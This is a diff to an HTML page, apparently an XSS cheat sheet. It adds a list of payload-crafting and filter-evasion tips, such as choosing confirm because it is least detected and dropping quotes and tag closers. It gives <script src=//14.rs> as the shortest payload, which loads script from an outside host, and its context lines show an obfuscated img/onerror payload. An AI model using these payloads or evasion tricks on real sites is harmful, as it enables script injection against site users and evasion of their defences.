@@ -98,4 +98,13 @@ This is similar to obfuscation done in PHP shells section<br/>
 &lt;img src="x:ö" title="onerror=alert(1)//"&gt;<br/>
 Some decoding will transform to:<ul><li style="list-style-type: none">&lt;img src="x:? title=" onerror=alert(1)//"&gt; allowing xss</li>
 </ul>
-</body></html>
+<br/>
+<b>Awesome Tips &amp; Tricks </b><ul><li>http(s):// can be shortened to // or /\\ or \\.</li>
+<li>document.cookie can be shortened to cookie. It applies to other DOM objects as well.</li>
+<li>alert and other pop-up functions don't need a value, so stop doing alert('XSS') and start doing alert()</li>
+<li>You can use // to close a tag instead of &gt;.</li>
+<li>I have found that confirm is the least detected pop-up function so stop using alert.</li>
+<li>Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use &lt;script src=//14.rs&gt; instead of &lt;script src="//14.rs"&gt;</li>
+<li>The shortest HTML context XSS payload is &lt;script src=//14.rs&gt; (19 chars)</li>
+</ul>
+&nbsp;</body></html>
